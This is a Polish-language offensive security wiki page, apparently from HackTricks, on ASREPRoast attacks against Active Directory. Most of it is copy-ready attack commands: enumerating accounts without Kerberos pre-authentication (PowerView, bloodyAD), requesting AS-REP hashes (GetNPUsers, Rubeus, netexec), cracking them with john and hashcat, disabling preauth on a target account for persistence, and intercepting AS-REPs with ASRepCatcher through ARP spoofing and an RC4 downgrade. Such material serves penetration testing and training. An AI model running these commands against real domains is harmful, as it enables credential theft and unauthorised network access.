# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast to atak bezpieczeństwa, który wykorzystuje użytkowników, którzy nie mają włączonego Kerberos pre-authentication required attribute. Zasadniczo ta podatność pozwala atakującemu zażądać uwierzytelnienia użytkownika od Kontrolera domeny (DC) bez potrzeby posiadania hasła użytkownika. Kontroler domeny odpowiada komunikatem zaszyfrowanym przy użyciu klucza pochodzącego z hasła użytkownika, który atakujący mogą spróbować złamać offline, aby odkryć hasło użytkownika.

Główne wymagania tego ataku to:

- **Lack of Kerberos pre-authentication**: Docelowi użytkownicy nie mogą mieć włączonej tej funkcji bezpieczeństwa.
- **Połączenie z Kontrolerem domeny (DC)**: Atakujący potrzebują dostępu do DC, aby wysyłać żądania i odbierać zaszyfrowane komunikaty.
- **Opcjonalne konto domenowe**: Posiadanie konta domenowego pozwala atakującym bardziej efektywnie zidentyfikować podatnych użytkowników za pomocą zapytań LDAP. Bez takiego konta atakujący muszą zgadywać nazwy użytkowników.

#### Enumerowanie podatnych użytkowników (wymagane poświadczenia domenowe)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Żądanie komunikatu AS_REP
```bash:Using Linux
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> AS-REP Roasting with Rubeus wygeneruje 4768 z encryption type 0x17 i preauth type 0.

#### Szybkie komendy (Linux)

- Najpierw zenumeruj potencjalne cele (np. z leaked build paths) za pomocą Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Pobierz AS-REP pojedynczego użytkownika nawet z **pustym** hasłem używając `netexec ldap <dc> -u svc_scan -p '' --asreproast out.asreproast` (netexec także wypisuje LDAP signing/channel binding posture).
- Złam za pomocą `hashcat out.asreproast /path/rockyou.txt` – automatycznie wykrywa **-m 18200** (etype 23) dla AS-REP roast hashes.

### Cracking
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Utrzymanie dostępu

Wymuś, aby **preauth** nie było wymagane dla użytkownika, dla którego masz uprawnienia **GenericAll** (lub uprawnienia do zapisu atrybutów):
```bash:Using Windows
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast bez poświadczeń

Atakujący może wykorzystać pozycję man-in-the-middle, aby przechwycić pakiety AS-REP podczas ich przesyłania po sieci, nie polegając na wyłączeniu Kerberos pre-authentication. Dzięki temu działa to dla wszystkich użytkowników w VLAN.\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) pozwala nam to zrobić. Co więcej, narzędzie wymusza na stacjach roboczych klientów użycie RC4 poprzez zmianę negocjacji Kerberos.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Bibliografia

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
